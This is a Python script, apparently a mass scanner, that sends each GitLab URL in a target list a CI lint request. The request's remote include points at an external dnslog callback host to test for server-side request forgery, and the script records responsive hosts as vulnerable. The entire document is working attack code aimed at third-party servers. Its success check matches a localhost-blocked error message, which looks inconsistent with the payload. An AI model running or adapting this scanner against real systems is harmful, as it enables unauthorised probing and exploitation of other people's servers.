import requests
import time

headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
	"Content-Type": "application/json"
}

data = """{
"include_merged_yaml": true, "content": "include:\\n  remote: http://dxndvx.dnslog.cn/api/v1/targets?test.yml"
}
"""

for url in open("GitLab.txt"):
	try:
		url = url.replace("\n", "")
		print(url+"检测中----\n\n")
		jiaoyan = requests.post(url+"/api/v4/ci/lint", headers=headers, data=data, verify=False, timeout=5)
		if ('{"status":"invalid","errors":["Remote file could not be fetched because URL \'http://dxndvx.dnslog.cn/api/v1/targets?test.yml\' is blocked: Requests to localhost are not allowed!"]}' in jiaoyan.text) and (jiaoyan.status_code == 200):
			with open("GitLab SSRF vul.txt", "a+") as f:
				f.write(url+"\n")
	except:
		continue

